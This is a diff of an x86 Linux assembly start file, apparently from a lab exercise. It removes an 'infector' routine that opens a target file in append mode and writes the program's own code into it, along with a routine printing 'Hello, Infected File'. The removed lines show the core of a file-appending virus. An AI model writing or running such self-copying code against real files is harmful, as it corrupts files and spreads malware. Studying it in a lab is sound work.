@@ -1,12 +1,7 @@
-section .rodata
-    hello db 'Hello, Infected File',0xA ; define the string to be printed and add linefeed character
 section .text
 global _start
 global system_call
-global infection
-global infector
 extern main
-code_start:
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -43,32 +38,3 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
-
-infection:
-    mov     eax, 4          ; system call for write
-    mov     ebx, 1          ; file descriptor for stdout
-    mov     ecx, hello      ; address of the string to be printed
-    mov     edx, 21         ; length of the string
-    int     0x80            ; invoke system call
-    ret
-infector:
-    open_for_append:
-        mov     eax, 5              ;system open
-        mov     ebx, dword[esp+4]   ;when calling a function, the argumented are pushed then the return address is pushed, so we have push name, then push return address
-        mov     ecx, 2000o          ;APPEND
-        or      ecx, 1              ;APPEND | write
-        int     0x80
-        cmp     eax, 0
-        jle exit_program
-    write_virus:
-        mov     ebx, eax
-        mov     eax, 4              ;system write
-        mov     ecx, code_start
-        mov     edx, code_end - code_start
-        int     0x80
-    close_file:
-        mov     eax, 6
-        int     0x80
-    exit_program:
-    ret
-code_end:
